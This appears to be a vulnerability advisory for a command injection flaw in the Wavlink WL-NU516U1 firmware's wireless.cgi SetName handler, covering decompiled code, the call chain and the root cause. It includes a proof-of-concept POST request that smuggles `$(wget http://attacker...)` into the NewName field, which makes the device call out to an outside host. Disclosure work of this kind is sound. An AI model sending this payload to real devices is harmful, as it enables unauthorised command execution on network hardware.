# WL-NU516U1 wireless.cgi SetName NewName Command Injection

Vendor: Wavlink

Product: WL-NU516U1

Version: M16U1_V240425
Firmware Download: https://docs.wavlink.xyz/Firmware/?category=USB+Printer+Server&model=WL-NU516U1-A

Vulnerability: Command Injection

CVE: TBD

## Affected version

Wavlink WL-NU516U1 M16U1_V240425

## Vulnerability details

Wavlink WL-NU516U1 M16U1_V240425 contains a command injection vulnerability in /cgi-bin/wireless.cgi.

When the `page` parameter is set to `SetName`, the function `sub_403198` is invoked.

The function reads `NewName` from POST data and concatenates it into a shell command:

```c
sprintf(v14, "/etc/lighttpd/www/cgi-bin/change_name.sh %s %s &", v4, v7);
sub_405314(v14);
```

Where `v4` = `mac_5g` and `v7` = `NewName`. No sanitization is applied to either parameter.

## Binary Analysis

### Call Chain

```
ftext (main router)
  → sub_403198 (SetName handler)
    → sub_405EA8 (URL decode, reads NewName POST parameter)
    → sprintf (concatenates into shell command)
    → sub_405314 (system() wrapper)
```

### Key Functions

**sub_403198 (SetName handler):**
- Reads two POST parameters via `sub_405EA8`:
  - `mac_5g` → variable `v4`
  - `NewName` → variable `v7`
- Concatenates both into a shell command and executes via `sub_405314`

**sub_405314 (system wrapper):**
```c
void sub_405314(const char *cmd) {
    system(cmd);
}
```

### Vulnerability Flow

1. User sends POST request with `page=SetName&mac_5g=AA:BB:CC:DD:EE:FF&NewName=$(wget http://attacker:6666/callback)`
2. `sub_403198` reads `NewName` → `$(wget http://attacker:6666/callback)`
3. No input filter is called (unlike GuestWifi handler)
4. sprintf constructs: `/etc/lighttpd/www/cgi-bin/change_name.sh AA:BB:CC:DD:EE:FF $(wget http://attacker:6666/callback) &`
5. `sub_405314` calls `system()`, shell interprets `$(wget ...)` as command substitution
6. `wget` connects to attacker's server, confirming command execution

### Why No Filter

The SetName handler (`sub_403198`) does NOT call the input filter function `sub_4074A0`. This is likely because the developer assumed the parameters would only contain valid device names and MAC addresses, but no validation enforces this assumption.

## Proof of Concept (PoC)

```http
POST /cgi-bin/wireless.cgi HTTP/1.1
Host: 192.168.6.3
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.6.3/
Connection: close
Content-Length: 62

page=SetName&mac_5g=AA:BB:CC:DD:EE:FF&NewName=$(wget http://192.168.6.1:6666/newname)
```

**Verification:** Monitor receives `GET /newname` from device IP, confirming command execution.

## Root Cause Summary

The root cause is:
1. No input sanitization or validation of the `NewName` parameter
2. No input filter function is called in the SetName handler
3. Direct concatenation of user input into a shell command passed to `system()`
